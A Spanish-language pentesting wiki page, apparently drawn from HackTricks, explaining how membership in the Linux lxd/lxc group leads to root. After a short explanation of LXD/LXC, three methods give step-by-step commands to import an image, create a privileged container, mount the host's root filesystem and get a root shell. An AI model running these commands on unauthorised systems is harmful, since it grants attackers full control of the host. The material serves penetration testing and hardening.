---
description: Si perteneces a estos grupos puedes convertirte en root
---

# LXD/LXC GROUP

## INFORMACIÓN GENERAL

LXD, forma abreviada de Linux Container Daemon, es una herramienta de gestión de los **contenedores del sistema operativo Linux**.

LXD es una **tecnología hermana de LXC**, forma abreviada de Linux Containers. [LXC](https://www.ionos.es/digitalguide/servidores/know-how/que-es-lxc/) es una [tecnología de virtualización](https://www.ionos.es/digitalguide/servidores/know-how/docker-tools-el-ecosistema-docker-de-cerca/) a nivel de sistema operativo basada en contenedores. LXC combina espacios de nombres aislados y los “cgroups” del kernel de Linux para crear entornos aislados para ejecutar código. Históricamente, LXC también fue el origen de la popular tecnología de virtualización [Docker](https://www.ionos.es/digitalguide/servidores/know-how/docker-tools-el-ecosistema-docker-de-cerca/).

Uno de los objetivos básicos que había detrás el desarrollo de LXD era hacer la gestión de contenedores LXC lo más cómoda posible, como es habitual en el caso de las [máquinas virtuales](https://www.ionos.es/digitalguide/servidores/know-how/maquina-virtual/). Sin embargo, el enfoque basado en contenedores ofrece un rendimiento superior al de las máquinas virtuales.

Utilizando LXD, **los contenedores del sistema operativo Linux pueden ser configurados y controlados con un conjunto de comandos predefinidos**. Por lo tanto, es muy adecuado para automatizar la gestión de contenedores y, a menudo, es utilizado para soluciones cloud y data centers.

## VULNERABILIDADES

{% embed url="https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation" %}
Fuente
{% endembed %}

### Método 1

Puedes instalar en tu máquina atacante la aplicación distrobuilder y seguir las instrucciones de su github:

{% embed url="https://github.com/lxc/distrobuilder" %}
Fuente
{% endembed %}

```
sudo su
#Install requirements
sudo apt update
sudo apt install -y golang-go debootstrap rsync gpg squashfs-tools
#Clone repo
sudo go get -d -v github.com/lxc/distrobuilder
#Make distrobuilder
cd $HOME/go/src/github.com/lxc/distrobuilder
make
#Prepare the creation of alpine
mkdir -p $HOME/ContainerImages/alpine/
cd $HOME/ContainerImages/alpine/
wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml
#Create the container
sudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml -o image.release=3.8
```

A continuación se suben a la víctima los archivos **lxd.tar.xz** y **rootfs.squashfs.**

Después añadimos la imagen a lxd:

```
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
lxc image list #You can see your new imported image
```

Creamos un contenedor y añadimos el root path:

```
lxc init alpine privesc -c security.privileged=true
lxc list #List containers

lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```

{% hint style="danger" %}
_**Error: No storage pool found. Please create a new storage pool**_

Ejecute **lxc init** y **repita** el proceso anterior
{% endhint %}

Ejecute el container

```bash
lxc start privesc
lxc exec privesc /bin/sh
[email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
```

### Método 2

Construya una imagen de la distro Alpine e iniciela utilizando la flag `security.privileged=true` forzando al contenedor a interactuar como root con el sistema host.

```
# build a simple alpine image
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
sed -i 's,yaml_path="latest-stable/releases/$apk_arch/latest-releases.yaml",yaml_path="v3.8/releases/$apk_arch/latest-releases.yaml",' build-alpine
sudo ./build-alpine -a i686

# import the image
lxc image import ./alpine*.tar.gz --alias myimage # It's important doing this from YOUR HOME directory on the victim machine, or it might fail.

# before running the image, start and configure the lxd storage pool as default 
lxd init

# run the image
lxc init myimage mycontainer -c security.privileged=true

# mount the /root into the image
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true

# interact with the container
lxc start mycontainer
lxc exec mycontainer /bin/sh
```

Existe una herramienta automatizada para hacer esto:

{% embed url="https://github.com/initstring/lxd_root" %}
Fuente
{% endembed %}

### Con internet

Solo debe seguir estas instrucciones:

```
lxc init ubuntu:16.04 test -c security.privileged=true
lxc config device add test whatever disk source=/ path=/mnt/root recursive=true 
lxc start test
lxc exec test bash
[email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
```
